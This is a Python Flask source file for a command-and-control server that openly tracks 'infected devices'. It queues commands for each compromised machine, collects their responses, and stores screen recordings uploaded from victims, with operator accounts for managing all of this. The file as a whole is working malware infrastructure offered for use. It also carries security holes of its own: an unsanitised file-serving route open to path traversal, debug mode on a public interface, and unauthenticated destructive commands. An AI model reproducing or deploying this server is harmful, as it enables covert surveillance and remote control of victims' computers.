import os
import json
import bcrypt
from time import sleep
from uuid import uuid4
from flask_cors import CORS
from datetime import datetime, timedelta
from flask import Flask, jsonify, send_file, request

app = Flask(__name__)
CORS(app, supports_credentials=True)

SCREEN_RECORDINGS_DIR = "screen_recordings"
DATA_FIL = "data.json"

def _readf():
  """ Reads the data.json file and returns its contents as a dictionary.
  If the file does not exist, it creates it with a default structure. """
  if not os.path.exists(DATA_FIL):
    with open(DATA_FIL, "w") as file:
      json.dump({"infected_devices": {}, "messages": {}, "responses": {}, "users": [], "sessions": []}, file, indent=2)
      
  with open(DATA_FIL, "r") as file:
    return json.load(file)
def _writef(data):
  """ Writes the given data to the data.json file in a formatted manner. """
  with open(DATA_FIL, "w") as file:
    json.dump(data, file, indent=2)

def load_data(path_str):
  """ Reads the value at path specified in the data.json. """
  file = _readf()
  for key in path_str.split('.'):
    if key in file:
      file = file[key]
    else:
      return None
  return file
def write_data(path_str, value):
  """ Writes the value at path specified in the data.json. """
  root = _readf()
  current = root
  keys = path_str.split('.')

  for key in keys[:-1]:
    if key not in current or not isinstance(current[key], dict):
      current[key] = {}
    current = current[key]

  current[keys[-1]] = value
  _writef(root)
def delete_data(path_str):
  root = _readf()
  current = root
  keys = path_str.split('.')
  last_key = keys.pop()
  
  for key in keys:
    if key in current: current = current[key]
    else: return
  
  if last_key in current:
    current.pop(last_key, None) 
    _writef(root)

def assign_token(username):
  token = str(uuid4())
  expiry = (datetime.now() + timedelta(hours=3)).astimezone().isoformat(timespec='seconds')

  write_data('sessions', [
    *(load_data('sessions') or []),
    {
      "for": username,
      "token": token,
      "expires": expiry
    }
  ])

  return [token, expiry]

@app.route("/")
def home(): return send_file("templates/index.html")

@app.route("/success")
def success(): return send_file("templates/success/index.html")

@app.route("/fatal")
def fatal(): return send_file("templates/fatal/index.html")

@app.route("/auth", methods=["POST"])
def auth():
  DEVICE = request.args.get('device', '').upper()
  if not DEVICE: return jsonify({'status': 'fatal', 'message': 'malformed req'}), 400
  
  message = request.get_json(True, True) or {}
  CODE_BY_DEVICE = message.get('authcode', '')
  ACTUAL_CODE = load_data(f'infected_devices.{DEVICE}.authcode')

  if CODE_BY_DEVICE == ACTUAL_CODE:
    write_data(f'infected_devices.{DEVICE}.state', 'verified')
    return jsonify({'status': 'success'}), 201
  else: 
    write_data(f'infected_devices.{DEVICE}.state', 'unverified')
    return jsonify({'status': 'fatal', 'message': 'non-matching authcode'}), 401

@app.route("/mngr/register", methods=["POST", "GET"])
def register():
  if request.method == "POST":
    DATA = request.get_json(True, True) or {}
    username = DATA.get('username', '').strip()
    password = DATA.get('password', '')
    if not username or not password: return jsonify({'status': 'fatal', 'message': 'Missing fields.'}), 400

    users = load_data('users') or []
    if any(user.get('name') == username for user in users): return jsonify({'status': 'fatal', 'message': 'Bad params.'}), 400

    write_data('users', [
      *users,
      {
        "name": username,
        "uuid": str(uuid4()),
        "password": bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8'),
      }
    ])

    token, expiry = assign_token(username)
    return jsonify({'status': 'success', 'token': token, 'expiry': expiry}), 201

  return send_file('templates/mngr/register/index.html')

@app.route("/mngr/login", methods=["POST", "GET"])
def login():
  if request.method == "POST":
    DATA = request.get_json(True, True) or {}
    username = DATA.get('username', '').strip()
    password = DATA.get('password', '')
    if not username or not password: return jsonify({'status': 'fatal', 'message': 'Missing fields.'}), 400

    users = load_data('users') or []
    user_info = next((user for user in users if user.get('name') == username), None)
    print(user_info)

    if user_info and bcrypt.checkpw(password.encode('utf-8'), user_info['password'].encode('utf-8')):
      token, expiry = assign_token(username)
      return jsonify({'status': 'success', 'token': token, 'expiry': expiry}), 200
    return jsonify({'status': 'fatal', 'message': 'Bad username or password.'}), 400
  
  return send_file('templates/mngr/login/index.html')

@app.route("/commands", methods=["POST", "GET"])
def commands():    
  INFECTED_DEVICES = load_data("infected_devices")
  DEVICE = request.args.get('device', '').upper()
  if request.method == 'POST':
    message = request.get_json(True, True) or {}
    req = message.get('request', '')

    # Server Payload Handler
    if 'ping' in req:
      return jsonify({'status': 'pong'}), 202
    if 'new-device' in message:
      DATA = message['new-device']
      DEVICE_NAME = DATA.get('name', '').upper()
      OWNER = DATA.get('owner')
      AUTHCODE = DATA.get('authcode')
      if not DEVICE_NAME or not OWNER or not AUTHCODE: return jsonify({'status': 'fatal', 'message': 'missing fields'}), 400
      if DEVICE_NAME not in INFECTED_DEVICES:
        write_data(
          f'infected_devices.{DEVICE_NAME}', 
          {'state': 'unverified', 'owner': OWNER, 'authcode': AUTHCODE}
        )
      return jsonify({'status': 'success'}), 201
    elif 'delete-all-devices' in req:
      write_data('infected_devices', {})
      return jsonify({'status': 'success'}), 201
    elif 'get-all-devices' in req:
      return jsonify({'status': 'success', 'devices': INFECTED_DEVICES}), 200
    elif 'remove-device' in req:
      if DEVICE in INFECTED_DEVICES:
        delete_data(f'infected_devices.{DEVICE}')
        delete_data(f'messages.{DEVICE}')
      return jsonify({'status': 'success'}), 200

    # WebClient Payload Handler
    if DEVICE in INFECTED_DEVICES:
      write_data(f'messages.{DEVICE}', [
        *(load_data(f'messages.{DEVICE}') or []),
        message
      ])
      return jsonify({'status': 'success'}), 201

    return jsonify({'status': 'fatal', 'message': f'non-exsistent device {DEVICE}'}), 404
  elif request.method == 'GET':
    MESSAGES = load_data(f'messages.{DEVICE}')
    if DEVICE in INFECTED_DEVICES:
      delete_data(f'messages.{DEVICE}')
      return jsonify(MESSAGES), 200
    
    return jsonify({'status': 'fatal', 'message': f'non-exsistent device {DEVICE}'}), 404

@app.route("/responses", methods=["POST", "GET"])
def responses_path():
  INFECTED_DEVICES = load_data('infected_devices')
  DEVICE = request.args.get('device', '').upper()
  if request.method == 'POST':
    # WebClient Video Submission Handler
    if request.files and request.form:
      FILENAME = request.form.get('filename')
      video = request.files['video']

      if DEVICE in FILENAME and DEVICE in INFECTED_DEVICES:
        video.save(os.path.join(SCREEN_RECORDINGS_DIR, FILENAME))
        return jsonify({'status': 'success'}), 201

      return jsonify({'status': 'fatal', 'message': 'video sent fron non-registered device.'}), 406
    else:
      # WebClient Standard Response Handler
      if DEVICE in INFECTED_DEVICES:
        write_data(f'responses.{DEVICE}', [
          *(load_data(f'responses.{DEVICE}') or []),
          request.get_json(True, True) or {}
        ])
        return jsonify({'status': 'success'}), 201
      
      return jsonify({'status': 'fatal', 'message': f'non-exsistent device {DEVICE}'}), 404
  elif request.method == 'GET':
    RESPONSES = load_data(f'responses.{DEVICE}')
    if DEVICE in INFECTED_DEVICES:
      delete_data(f'responses.{DEVICE}')
      return jsonify(RESPONSES), 200

    return jsonify({'status': 'fatal', 'message': f'non-exsistent device {DEVICE}'}), 404

@app.route("/resources/<path:filename>")
def serve_resource(filename):
  return send_file(f"templates/{filename}")

if __name__ == "__main__":
  app.run(host='0.0.0.0', port=8003, debug=True)